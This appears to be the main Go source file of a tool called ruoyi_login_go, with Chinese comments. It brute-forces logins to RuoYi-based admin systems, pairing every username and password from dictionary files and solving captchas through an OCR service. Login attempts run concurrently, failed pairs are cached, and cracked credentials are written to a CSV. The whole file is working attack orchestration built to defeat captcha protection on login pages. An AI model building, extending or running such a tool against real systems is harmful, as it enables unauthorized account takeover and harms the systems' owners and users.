package main

import (
	"bufio"
	"fmt"
	"net/http"
	"os"
	"sync"
	"time"

	"ruoyi_login_go/cache"
	"ruoyi_login_go/config"
	"ruoyi_login_go/csvwriter"
	"ruoyi_login_go/logging"
	"ruoyi_login_go/ocr"
	"ruoyi_login_go/progress"
	"ruoyi_login_go/worker"

	"github.com/schollz/progressbar/v3"
)

func main() {
	cfg, err := config.ParseArgs()
	if err != nil {
		fmt.Printf("[-] 解析参数失败: %v\n", err)
		os.Exit(1)
	}

	// 初始化日志器
	logCfg := logging.NewLogConfig(cfg.LogLevel, cfg.LogFile, cfg.ConsoleFormat)
	if err := logging.InitDefaultLogger(logCfg); err != nil {
		fmt.Printf("初始化日志器失败: %v\n", err)
		os.Exit(1)
	}
	defer logging.Sync()

	// 初始化验证码 debug 目录
	ocr.InitDebug(cfg.DebugCaptcha)
	cfg.DebugCaptchaEnabled = cfg.DebugCaptcha

	failedCache := cache.NewFailedCache()
	successCache := cache.NewSuccessCache()
	// 当未指定 --no-cache 时，加载缓存过滤
	if !cfg.NoCache {
		if err := failedCache.Load(cfg.CacheFile); err != nil {
			logging.Warnf("加载缓存失败: %v", err)
		}
	} else {
		logging.Infof("已忽略缓存过滤 (--no-cache)")
	}

	users, passwords, err := loadCredentials(cfg)
	if err != nil {
		logging.Errorf("加载凭据失败: %v", err)
		os.Exit(1)
	}

	totalTasks := countTasks(users, passwords, failedCache)
	if totalTasks == 0 {
		logging.Infof("无待处理任务。")
		return
	}

	// 创建 OCR 客户端用于健康检查（后续工作器会复用）
	ocrClient, err := worker.GetGlobalOcrClient(cfg)
	if err != nil {
		logging.Errorf("创建 OCR 客户端失败: %v", err)
		os.Exit(1)
	}

	if err := checkOcrHealth(ocrClient, cfg.OcrAPI); err != nil {
		logging.Errorf("OCR API 不可用: %v", err)
		fmt.Println("[-] 请确保 OCR API 服务已启动")
		os.Exit(1)
	}
	logging.Infof("OCR API 可用")

	csvWriter, err := initCSVWriter(cfg)
	if err != nil {
		logging.Errorf("创建 CSV 写入器失败: %v", err)
		os.Exit(1)
	}
	defer csvWriter.Close()

	captchaQueue := make(chan *worker.CaptchaItem, cfg.PoolSize)
	captchaReady := make(chan struct{}, 1)
	stopChan := make(chan struct{})
	var stopOnce sync.Once
	stopFunc := func() {
		stopOnce.Do(func() {
			close(stopChan)
		})
	}

	tracker := progress.NewProcessBar(int64(totalTasks), "[*] 进度:")
	defer tracker.Finish()

	logging.Infof("启动验证码识别线程 (并发:%d)...", cfg.FillerWorkers)
	fillerWg := startFillerWorkers(cfg, captchaQueue, stopChan, captchaReady)

	if err := waitForCaptcha(captchaReady, stopChan); err != nil {
		logging.Errorf("等待验证码失败: %v", err)
		stopFunc()
		return
	}

	logging.Infof("启动登录并发 (并发:%d) | 待处理任务: %d", cfg.LoginWorkers, totalTasks)

	loginWg, producerWg := startLoginWorkers(cfg, captchaQueue, stopChan, users, passwords, failedCache, successCache, tracker, stopFunc, csvWriter)

	// 等待登录工作器完成，然后停止验证码填充器
	loginWg.Wait()
	stopFunc()
	producerWg.Wait()

	// 关闭所有写入器，确保数据刷新到磁盘
	failedCache.CloseWriter()
	successCache.Close()

	// 再等待填充器退出（避免写入器未关闭导致死锁）
	fillerWg.Wait()
	worker.CloseGlobalOcrClient()

	logging.Infof("任务结束")
}

// loadCredentials 加载用户密码字典
func loadCredentials(cfg *config.Config) ([]string, []string, error) {
	users, err := readLines(cfg.UserFile)
	if err != nil {
		return nil, nil, fmt.Errorf("读取用户字典失败: %w", err)
	}

	passwords, err := readLines(cfg.PassFile)
	if err != nil {
		return nil, nil, fmt.Errorf("读取密码字典失败: %w", err)
	}

	return users, passwords, nil
}

// countTasks 计算总任务数（使用批量查询，单次加锁避免 n×m 次锁竞争）
func countTasks(users, passwords []string, failedCache *cache.FailedCache) int {
	return failedCache.CountMisses(users, passwords)
}

// checkOcrHealth 检查 OCR API 健康状态
func checkOcrHealth(ocrClient *http.Client, ocrAPI string) error {
	return ocr.CheckHealth(ocrClient, ocrAPI)
}

// initCSVWriter 初始化 CSV 写入器
func initCSVWriter(cfg *config.Config) (*csvwriter.CSVWriter, error) {
	csvHeaders := []string{"URL", "Username", "Password", "Status", "Length", "Snippet"}
	return csvwriter.NewCSVWriter(cfg.Output, csvHeaders)
}

// startFillerWorkers 启动验证码填充器
func startFillerWorkers(cfg *config.Config, captchaQueue chan *worker.CaptchaItem, stopChan chan struct{}, notifyChan chan struct{}) *sync.WaitGroup {
	var fillerWg sync.WaitGroup
	for i := 0; i < cfg.FillerWorkers; i++ {
		fillerWg.Add(1)
		go worker.CaptchaFillerWorker(cfg, captchaQueue, stopChan, &fillerWg, notifyChan)
	}
	return &fillerWg
}

// waitForCaptcha 等待验证码队列就绪（事件驱动，无需轮询）
func waitForCaptcha(notifyChan chan struct{}, stopChan chan struct{}) error {
	select {
	case <-notifyChan:
		return nil
	case <-stopChan:
		return fmt.Errorf("任务已停止")
	case <-time.After(60 * time.Second):
		return fmt.Errorf("等待验证码超时")
	}
}

// startLoginWorkers 启动登录工作器
func startLoginWorkers(cfg *config.Config, captchaQueue chan *worker.CaptchaItem, stopChan chan struct{}, users, passwords []string, failedCache *cache.FailedCache, successCache *cache.SuccessCache, tracker *progressbar.ProgressBar, stopFunc func(), csvWriter *csvwriter.CSVWriter) (*sync.WaitGroup, *sync.WaitGroup) {
	var loginWg sync.WaitGroup
	taskChan := make(chan [2]string, cfg.LoginWorkers*2)

	var producerWg sync.WaitGroup
	producerWg.Add(1)
	go func() {
		defer producerWg.Done()
		defer close(taskChan)

		for _, u := range users {
			for _, p := range passwords {
				if failedCache.Contains(u, p) {
					continue
				}

				select {
				case taskChan <- [2]string{u, p}:
				case <-stopChan:
					return
				}
			}
		}
	}()

	for i := 0; i < cfg.LoginWorkers; i++ {
		loginWg.Add(1)
		go func() {
			defer loginWg.Done()
			for {
				select {
				case <-stopChan:
					return
				case task, ok := <-taskChan:
					if !ok {
						return
					}
					loginCtx := &worker.LoginWorkerContext{
						Cfg:          cfg,
						CaptchaQueue: captchaQueue,
						Username:     task[0],
						Password:     task[1],
						Tracker:      tracker,
						FailedCache:  failedCache,
						SuccessCache: successCache,
						StopChan:     stopChan,
						StopFunc:     stopFunc,
						CSVWriter:    csvWriter,
					}
					worker.LoginWorker(loginCtx)
				}
			}
		}()
	}

	return &loginWg, &producerWg
}

func readLines(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		if line != "" {
			lines = append(lines, line)
		}
	}
	return lines, scanner.Err()
}
